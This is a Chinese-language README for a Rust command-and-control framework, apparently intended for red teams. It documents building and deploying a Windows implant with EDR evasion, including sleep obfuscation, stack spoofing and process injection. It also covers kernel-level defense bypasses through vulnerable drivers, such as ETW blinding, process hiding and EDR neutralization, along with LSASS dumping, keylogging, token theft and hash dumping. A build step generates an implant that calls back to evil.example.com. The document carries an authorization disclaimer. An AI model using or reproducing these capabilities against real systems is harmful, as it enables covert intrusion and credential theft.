# Nyx C2 Framework

> **授权红队 / 渗透测试专用。禁止在未获授权的系统上部署。**

纯 Rust 全栈 C2 框架,融合 Cobalt Strike 的可扩展性与 Brute Ratel 的默认隐蔽性。所有能力状态以代码核对为准(审计报告 [`docs/audits/CODE_TRUTH_2026-07-15.md`](docs/audits/CODE_TRUTH_2026-07-15.md))。

**实测规模**:88,874 行 Rust · 26 crate + 1 tool · 674 单元测试 · 55 selftest 导出 · 27 Command / 7 Response 变体。

---

## 功能概览

| 层 | 能力 | 代码实情 |
|---|---|---|
| **加密协议** | X25519 ECDH + HKDF-SHA256 + ChaCha20-Poly1305;方向隔离 nonce;单调计数器防重放;secrets 零化 | ✅ 完整无弱点 |
| **团队服务器** | tokio/axum HTTP(S);三机制鉴权(bootstrap operator / operators file / legacy token);三角色 RBAC;会话/任务队列;SQLite 凭据+implant 库;哈希链审计;Rhai 事件脚本;Malleable C2 profile;implant 生成 | ✅ 完整 |
| **Windows PIC 植入体** | 30,848 LOC `no_std` DLL;27 Command;间接 syscall;Fluctuation 睡眠混淆;HWBP patchless blind;CFG 用户态 bitmap;LACUNA/insomniac/caller-spoof/proxy-veh scanner;Pool Party(投递半)+ Module Stomping + ThreadlessInject | ✅ 核心;见已知限制 |
| **内核层 SDK** | BYOVD(Shield/RTCore64/Iqvw64e 可用,WDTKernel loud-error);ETW-TI blind;DKOM 进程隐藏;回调中和;MiniFilter 解链;PatchGuard 窗口(2 real);PPL stripper;CFG bypass;LSASS dump;minidump 组装 | ✅ 算法完整;见已知限制 |
| **操作端** | Tauri 2 + React 桌面 GUI(3D 网络拓扑 + 语义化命令 + 结构化输出);REST API;SOCKS5 relay | 🔨 重写中(2026-07-17,替代旧 ratatui TUI + Makepad GUI) |
| **脚本 / 扩展** | Rhai 脚本(3 event);Malleable C2 profile(c2lint);BOF(CS ABI,W^X loader) | ✅ |

---

## 项目结构

```
crates/
├── protocol/              # 加密协议 (X25519+HKDF+ChaCha20-Poly1305, 2,464 LOC)
├── server/                # 团队服务器 (tokio/axum, 5,956 LOC)
├── store/                 # SQLite 凭据库 (842 LOC)
├── transport/             # TLS JA3/JA4 指纹计算 + 通道定义 (4,018 LOC)
├── rest/                  # REST 类型库 (client 共享, server 独立)
├── parse/                 # shell 输出解析器
├── profile/               # Malleable C2 profile 解析 + c2lint (2,240 LOC)
│
├── implant-win/           # Windows PIC 植入体 (no_std, 30,848 LOC)
│   ├── fluctuation.rs     #   睡眠混淆 (PAGE_NOACCESS 翻转 + heap RC4 mask)
│   ├── blind_hwbp.rs      #   HWBP patchless blind (VEH)
│   ├── cfg_user.rs        #   用户态 CFG bitmap 写入
│   ├── lacuna.rs          #   .pdata 间隙扫描
│   ├── inject.rs          #   Module Stomping + ThreadlessInject
│   ├── tp.rs              #   Pool Party section 投递 (默认 OFF)
│   ├── stack.rs           #   栈欺骗 SPOOF_SWAP (CET-off 自动 arm)
│   ├── sleep.rs           #   Foliage APC [死代码, 保留参考]
│   └── selftests.rs       #   48 个 selftest (全 crate 共 55)
├── operator-kernelsdk/    # 内核 EDR 绕过 SDK (9,789 LOC)
│   ├── byovd.rs           #   KernelRw trait + 驱动
│   ├── byovd_drivers/     #   Shield / RTCore64 / Iqvw64e / WDTKernel
│   ├── etwti.rs           #   ETW-TI blind (4-hop)
│   ├── etw_deception.rs   #   事件伪造 [死代码, 无 CLI 调用方]
│   ├── telemetry.rs       #   MiniFilter 解链 + 回调中和
│   ├── persistence.rs     #   DKOM 隐藏 + PPL + PatchGuard 窗口
│   └── win/ksld.rs        #   LivingOffDefender (优先于 BYOVD)
│
├── operator-kernel-cli/   # 内核 CLI (9 子命令 + daemon)
├── offset-resolver/       # ntoskrnl PDB 下载 + 偏移解析
├── minidump-assembler/    # LSASS 裸内存 → mimikatz .dmp
│
├── client-ui-web/         # 操作端 GUI (Tauri 2 + React + Three.js,3D 拓扑 + 语义化命令)
│
├── agent-dev/             # macOS/Linux 开发验证植入体 (完整协议循环)
├── bof-runner/            # BOF 加载器 (CS ABI)
├── coff/                  # COFF/AMD64 解析 + 重定位
├── evasion/               # syscall 解析 (Hell/Halo/Tartarus Gate)
├── implant-evasionsdk/    # 植入体逃避 SDK trait (5/9 有 live impl)
├── scripting/             # 脚本事件总线
├── scripting-rhai/        # Rhai 引擎绑定
├── config/                # 编译期加密配置 (ChaCha20-Poly1305)
├── config-macros/         # embed! proc-macro
├── nyx-loader/            # PIC payload 加密 [反射加载未实现]
├── nyx-mutate/            # 二进制变异 (NOP/寄存器轮转/密钥随机化)
└── pe/                    # [死 crate, 零依赖]
```

### 工作量统计(实测)

| 维度 | 数值 |
|---|---|
| 总 Rust 源码 | 88,874 行 |
| crate 数 | 26 + 1 tool(pe 死) |
| `#[test]` 函数 | 674 |
| selftest 导出 | 55 |
| wire Command 变体 | 27 |
| wire Response 变体 | 7 |
| TUI 命令 | 64(~58 独立顶层) |
| server API 端点 | 14 operator + 6 kernel(条件注册) |
| BYOVD 驱动 | 3 可用 + 1 loud-error |
| Windows build 覆盖 | 10240 · 14393 · 17763 · 19041 · 20348 · 22621 · 26100 |

---

## 环境要求

| 工具 | 版本 | 用途 |
|---|---|---|
| Rust stable | ≥ 1.80 | 服务端 / 客户端 / 支撑 crate |
| Rust nightly | — | 植入体(`implant-win`,`no_std`) |
| `x86_64-pc-windows-gnu` target | — | 植入体交叉编译 |
| `mingw-w64` | 16.1.0 推荐 | Windows 交叉链接器 |
| Windows Server 2019+ | — | 植入体真机运行 |

```bash
rustup target add x86_64-pc-windows-gnu
rustup toolchain install nightly
rustup component add rust-src --toolchain nightly
```

---

## 快速上手

### 1. 启动团队服务器

```bash
# 开发模式 (loopback HTTP, 无鉴权, 临时密钥对)
cargo run --release -p nyx-server

# 生产模式 (持久密钥 + Bearer + TLS)
NYX_BIND=0.0.0.0:8443 \
NYX_KEYFILE=~/.nyx/server.key \
NYX_BOOTSTRAP_OPERATOR=admin:your_secret \
NYX_TLS=on \
cargo run --release -p nyx-server
```

> `NYX_BIND` 默认 `127.0.0.1:8443`(loopback)。非 loopback 绑定且无鉴权时,服务器自动生成一次性 token 并打印;设 `NYX_ALLOW_OPEN=1` 才允许开放模式。

服务器启动后输出 X25519 公钥(hex),烤入植入体构建。

### 2. 构建 dev 植入体(macOS/Linux 协议验证)

```bash
export NYX_SERVER=http://127.0.0.1:8443
export NYX_SERVER_PUB=<服务器输出的公钥 hex>
cargo run --release -p nyx-agent-dev
```

### 3. 构建 Windows PIC 植入体

```bash
# 检查编译
cargo +nightly check -p nyx-implant-win --target x86_64-pc-windows-gnu

# Release 构建
cargo +nightly build --release -p nyx-implant-win \
  --target x86_64-pc-windows-gnu \
  -Z build-std=core,alloc
```

输出 `target/x86_64-pc-windows-gnu/release/nyx_implant_win.dll`。

> **编译期 gate**(均为 `option_env!`,默认值见下表):
> - `NYX_FLUCTUATION_OFF=1` — 关闭 Fluctuation 睡眠混淆(退到纯 sleep)
> - `NYX_SPOOF_OFF=1` — 关闭栈欺骗(CET-off 主机默认自动 arm)
> - `NYX_FOLIAGE_OFF=1` — 无运行时效果(Foliage APC 是死代码)
> - `NYX_TLS_INSECURE=1` — 放宽 WinHTTP 证书校验(默认 OFF,有已知 bug 见下)
> - `NYX_POOL_PARTY_ON=1` — 开启 Pool Party 注入(默认 OFF,仅投递半)
> - `NYX_SKIP_SANDBOX=1` — 跳过沙箱检测(SYSTEM 部署时)

### 4. 启动操作端 GUI (Tauri 2 + React)

```bash
cd crates/client-ui-web
npm install          # 首次：装前端依赖
npm run tauri dev    # 启动（自动连 http://127.0.0.1:8443，在连接页输入 bearer）
```

> GUI 含 3D 网络拓扑（Three.js，节点带官方 OS 图标）、语义化命令输入、结构化任务输出。
> 纯前端开发（不启动 Tauri 外壳）：`npm run dev`。

### 6. 服务器侧生成 implant

```bash
# TUI 内
/generate <callback_host> [port] [flags]

# 或 API
curl -X POST http://127.0.0.1:8443/api/generate-implant \
  -H "Authorization: Bearer admin:your_secret" \
  -H "Content-Type: application/json" \
  -d '{"callback":"evil.example.com","port":443,"format":"dll"}'
```

服务器 patch DLL 模板(每 implant 独立 X25519 keypair + config 加密 + mutation + 一次性 auth_token),`NYX_TEMPLATE` 指向模板路径。

---

## 服务器环境变量

| 变量 | 默认 | 说明 |
|---|---|---|
| `NYX_BIND` | `127.0.0.1:8443` | 监听地址 |
| `NYX_KEYFILE` | —(每次随机) | 持久 X25519 私钥(0600)。session 元数据经 SQLite 持久化层落盘(`NYX_CREDS` 库,boot 恢复,见 `server/src/lib.rs:201`) |
| `NYX_TOKEN` | — | legacy 共享 Bearer(Admin);优先级低于 operators file |
| `NYX_BOOTSTRAP_OPERATOR` | — | `name:secret` 首个 Admin(argon2 哈希) |
| `NYX_OPERATORS_FILE` | `~/.nyx/operators.json` | 操作员注册表 |
| `NYX_KILLDATE` | —(永不过期) | Unix 时间戳,过期拒绝所有 beacon |
| `NYX_TLS` | off | 任意值启用 rustls HTTPS |
| `NYX_CERT` / `NYX_KEY` | — | PEM 证书/密钥(需同时设) |
| `NYX_PROFILE` | — | Malleable C2 profile(c2lint 在加载时验证) |
| `NYX_SCRIPT` | — | Rhai 事件脚本(SessionNew/ResultReceived/SessionExit) |
| `NYX_CREDS` | `~/.nyx/server-creds.db` | 凭据+implant SQLite 路径 |
| `NYX_AUDIT_LOG` | `~/.nyx/audit.jsonl` | 审计日志(哈希链) |
| `NYX_TEMPLATE` | — | implant DLL 模板路径(启用生成) |
| `NYX_KERNEL_DAEMON` | — | `host:port` 内核 daemon;设后注册 `/api/kernel/*` 路由 |
| `NYX_ALLOW_OPEN` | — | `=1` 允许非 loopback 开放模式 |
| `NYX_SESSION_MAX_AGE` | `604800`(7d) | session 年龄 GC |
| `NYX_SESSION_MAX_IDLE` | `86400`(24h) | session 空闲 GC |
| `NYX_WORKDIR` | — | 服务器工作目录 |

---

## TUI 命令速查

64 个 `MetaCmd` 条目(~58 独立顶层),零 stub。全部映射到真实 REST 调用或本地 overlay。

### 会话管理

```
/sessions [filter]      列出活跃会话(支持 tag/star/alias 过滤)
/use <id>               选择当前操作会话
/info                   当前会话详情
/tasks                  任务队列
/rename /tag /untag     会话元数据
/star /note             收藏 / 备注
/alias add|rm|list      会话别名
/topo                   会话拓扑图
```

### 文件操作

```
/ls [path]              目录列表
/cd /mkdir /rm          文件系统操作
/mv /cp                 移动 / 复制
/upload <local> <remote>  上传
/download <remote> [local]  下载(分块)
```

### 执行

```
<shell cmd>             通过 cmd.exe 执行(无 / 前缀)
/bof <file.o> [args]    加载执行 BOF(CS ABI)
/inject <method> <target> <file>  进程注入(0=PoolParty 1=ThreadlessHWBP 2=ModuleStomp)
```

### 侦察

```
/ps                     进程列表
/ping                   存活检测
/portscan <host> <ports>  端口扫描
/net <ifconfig|arp|routes|conn>  网络信息
/drive                  磁盘信息
/clipboard              剪贴板
/env [name]             环境变量
/screenshot [mon]       截屏(跨会话, Task Scheduler)
/screenwatch <secs>     持续截屏
/trex                   T-REX 威胁分级扫描
```

### 权限 / 令牌

```
/getuid                 当前身份
/steal <pid>            窃取进程令牌
/make_token <d\u> <pass> [1|2|3]  创建模拟令牌
/rev2self               还原令牌
```

### 凭据 / 哈希

```
/hashdump [sam|system|lsass|shadow]  转储(lsass 在 implant 侧 deferred)
/keylog start|stop|dump  键盘记录
/keylog stream [secs]    持续键盘记录
/keylog unstream         停止持续记录
```

### 控制

```
/sleep <secs> [jitter%]  beacon 间隔
/channel <0-8|name>      切换 C2 通道
/kill                    终止植入体(需确认)
```

### 网络隧道

```
/pivot <host> <port>     建立 SOCKS5 通道
/socks start [addr]      SOCKS5 relay(loopback)
/socks stop              停止
/socks <chan> <op> <addr> <port>  手动通道控制
/chan close <id>         关闭通道
```

### 内核层(TUI 内, 需 `NYX_KERNEL_DAEMON`)

```
/driver-status           BYOVD/KslD 状态
/blind-etw               ETW-TI 盲化
/hide <pid>              DKOM 进程隐藏(需确认)
/dump-lsass <pid>        LSASS minidump(需确认)
/neutralize <pid> <freeze|choke|kill>  EDR 中和(需确认)
/detach-mf               MiniFilter 解链
```

### 凭据管理 / 审计 / 生成

```
/creds [list]            凭据列表(本地 overlay)
/creds find <query>      搜索
/creds sync [reveal]     从服务器同步
/creds add <realm> <user> <kind> <secret>  添加
/creds del <realm> <user> <kind>           删除
/creds export json|csv   导出
/audit [operator|action|limit]  审计日志
/audit verify            验证哈希链
/generate <cb> [port] [flags]  生成 implant
/implants                已生成 implant 列表
/revoke <pub>            撤销 implant
```

### 客户端

```
/connect <url> [token]   连接服务器
/profile                 当前 Malleable C2 profile
/theme <name>            主题(mocha/frappe/macchiato/hc/nocolor)
/config [stream_cap N]   客户端配置
/help /clear
```

---

## 内核层操作

> 需要 BYOVD 驱动或 KslD(LivingOffDefender,优先)+ SYSTEM 权限

```bash
# 内核 CLI
cargo run -p nyx-operator-kernel-cli -- \
  --driver \\.\RTCore64 --pid <target_pid> bootstrap

# 子命令: bootstrap / blind-etw / hide <pid> / dump-lsass <pid> \
#         neutralize <pid> <freeze|choke|kill> / detach-minifilter \
#         pg-window / cfg-bypass / --serve <port>(daemon 模式)
```

### 偏移自动解析

```bash
# 从 MS Symbol Server 下载 ntoskrnl.pdb 解析偏移
cargo run -p nyx-offset-resolver -- --ntoskrnl --guid <guid> --age <age>

# 或从 fltmgr.pdb 解析 FltGlobals RVA
cargo run -p nyx-offset-resolver -- --fltmgr --guid <guid> --age <age>
```

内置 EPROCESS 偏移表(14 build,patch-equivalent 展开):

| Windows Build | PID | Links | Protection |
|---|---|---|---|
| 17763(Server 2019 / Win10 1809) | `0x2e0` | `0x2e8` | `0x6ca` |
| 18362–19045(Win10 1903–22H2) | `0x2e8` | `0x2f0` | `0x6fa` |
| 20348 / 22000(Server 2022 / Win11 21H2) | `0x440` | `0x448` | `0x87a` |
| 22621 / 22631(Win11 22H2/23H2) | `0x440` | `0x448` | `0x87a` |
| 26100 / 26200(Win11 24H2/25H2) | `0x450` | `0x458` | `0x87e` |

---

## 线网协议

```
[32B 会话公钥][8B 计数器 LE][4B 密文长度 LE][密文 || 16B Poly1305 tag]
```

- 会话密钥 = `HKDF-SHA256(ECDH(implant_eph, server_id))`,绑定两端公钥,salt=server_pub,info=`"nyx-session-v1"‖server_pub‖implant_pub`
- AEAD = ChaCha20-Poly1305;96-bit nonce = 方向判别字节(0x00 C2S / 0x01 S2C)+ 计数器;公钥作 AAD
- 防重放:单调计数器,写锁保护,winner-takes-all 插入
- secrets(SessionKey/Keypair)impl Drop 零化;全零 scalar 拒绝
- 批量编解码有 allocation-bomb 守卫(MAX_BATCH=65536, MAX_WIRE_COUNT=256)

---

## 构建与测试

```bash
# 工作区构建(服务端 + 客户端 + 支撑 crate)
cargo build --workspace

# 全量测试
cargo test --workspace          # 674 个 #[test]

# 植入体检查(nightly + Windows target)
cargo +nightly check -p nyx-implant-win --target x86_64-pc-windows-gnu

# 内核 SDK 测试(独立 crate)
cargo test -p nyx-operator-kernelsdk    # 112 个 #[test]

# 独立 crate 测试
cargo test -p nyx-implant-evasionsdk     # 53 个 #[test]
cargo test -p nyx-transport              # 75 个 #[test]

# Malleable C2 profile 验证
cargo run -p nyx-profile --bin c2lint -- <profile.c2>

# lint
cargo clippy --workspace -- -D warnings
```

---

## 已知限制(代码核对实情)

| 项 | 代码实情 | 证据 |
|---|---|---|
| **Foliage APC .text 加密** | 🔴死代码 | `sleep.rs` 四函数 `#[allow(dead_code)]` + FATAL 注释;beacon 走 `kits::sleep`→Fluctuation,不调 `sleep::sleep()`。`NYX_FOLIAGE_OFF` 无运行时效果 |
| **栈欺骗 SPOOF_SWAP** | 🟡部分实现 | `mov rsp` asm 不崩,但 f 未在伪造栈执行;`#CP` 修复缝仅 doc。CET-off 主机运行时自动 arm ON(`entry.rs:143-150`),非"默认 OFF" |
| **WinHTTP TLS beacon** | 🟡有 bug | `WinHttpSetOption` 在 `WinHttpSendRequest` 失败后才设(`transport.rs:347-354`);应改到 send 之前。**默认不走此路径**(`NYX_TLS_INSECURE` 默认 OFF);明文 HTTP + 有效 CA HTTPS 正常 |
| **Pool Party 注入** | 🟡仅投递半 | 只有 section 投递,无 threadless 调度,退到 `NtCreateThreadEx`(经典 IOC 存在)。默认 OFF |
| **MiniFilter 解链** | ✅完整 | 算法 + flt_globals 解析 + PDB 工具 + CLI/server/client 全链接通 |
| **WFP silencer** | 🔴装配但必失败 | `block_outbound_for_pid` 永返 Err(安全 stub);tier 误报 `wfp=true` |
| **etw_deception 事件伪造** | 🟡死代码 | 完整实现但无 tier/CLI 调用方 |
| **nyx-loader 反射加载** | 🔴未实现 | 加密+组装真;PIC stub 以 `ret` 结尾,PEB walk/import resolve 是 Phase-2b |
| **nyx-mutate 指令替换** | 🔴不存在 | 只有 NOP 插入/寄存器轮转/密钥随机化三趟 |
| **transport/ crate** | 🟡零消费者 | 8 个 `Transport` impl + 1 stub,但无 beacon 调用;只有 JA3/JA4 计算接在 server |
| **指纹 emitter** | 🔴死代码 | 出站 JA3 不可控;`rquest` feature 空占位 |
| **fallback 链** | 🟡stub | 只有 `[Channel::Https]` 一个元素,`next_fallback` 永返 None |
| **C2 通道多样性** | 🟡需理解 | implant-win dispatcher 9 个,但 4 个 ExtC2(Slack/LLM/MCP/Discord)是 server 中转 `post_frame`,非直连第三方协议;DoH/DNS 是 URI 伪装 |
| **GUI 功能覆盖** | ✅全接入 | GUI console 命令层已接入全部 server 端点(kernel×6 / generate / implants / revoke / trex / channel×9 / keylog stream / socks / creds / audit);与 TUI 差异仅剩会话元数据 overlay(rename/tag/star/alias,客户端本地功能)。2026-07-16 本机 e2e 全过 |
| **`rest` crate** | 🟡半真相源 | server 不依赖它(自定义 view struct),只有两个 client 用;drift 靠人工约定 |
| **Win11 25H2 真机** | 🟡暂缓 | 需 CET+HVCI 物理机 |
| **sessions 持久化** | ✅持久化 | SQLite durability layer(`lib.rs:201`),boot 恢复;2026-07-16 实测重启 server 会话同 id 复原 |
| **SQLite migration** | 🔴无 | 仅 `CREATE TABLE IF NOT EXISTS` |

完整审计(含 25 条文档偏差表 + 19 条活跃缺陷):[`docs/audits/CODE_TRUTH_2026-07-15.md`](docs/audits/CODE_TRUTH_2026-07-15.md)

---

## 真机验证状态

| 目标环境 | 测试项 | 结果 |
|---|---|---|
| Windows Server 2019(17763.1339)+ Defender ON | 完整 beacon 循环(加密 check-in → 任务 → 执行 → 加密回传) | ✅ |
| 同上 | selftest(`scripts/win_selftest_all.ps1`) | ✅ |
| 同上 | 内核 SDK(BYOVD + ETW-TI + DKOM + 回调中和) | ✅ |
| 同上 | /screenshot 跨会话(Session 0 → 2) | ✅ |
| 同上 | /hashdump SAM + SYSTEM hive | ✅ |
| Win11 24H2(build 26100,CI runner) | 编译无回归 | ✅ |
| Win11 25H2 CET+HVCI 物理机 | SPOOF_SWAP CET 修复缝 / HVCI 硬件触发 | 🟡 需物理机 |

---

## Roadmap

- **TLS beacon 修复** — `WinHttpSetOption` 移到 `WinHttpSendRequest` 之前
- **SPOOF_SWAP 完成** — CET `#CP` 修复缝(`KiControlProtectionFault` + `RtlRestoreContext`)+ 伪造栈执行
- **CET 物理机验证** — Win11 25H2 CET+HVCI 真机
- **nyx-loader 反射加载** — PEB walk / import resolve / DllMain
- **GUI 会话元数据 overlay** — rename / tag / star / alias(TUI 有,GUI 无;客户端本地功能)
- **transport/ crate 接线** — 让 beacon 走 `TransportStack` 而非自滚 WinHTTP

---

## 免责声明

本项目仅用于授权安全测试和研究目的。**请勿在未明确授权的系统上部署或运行。**
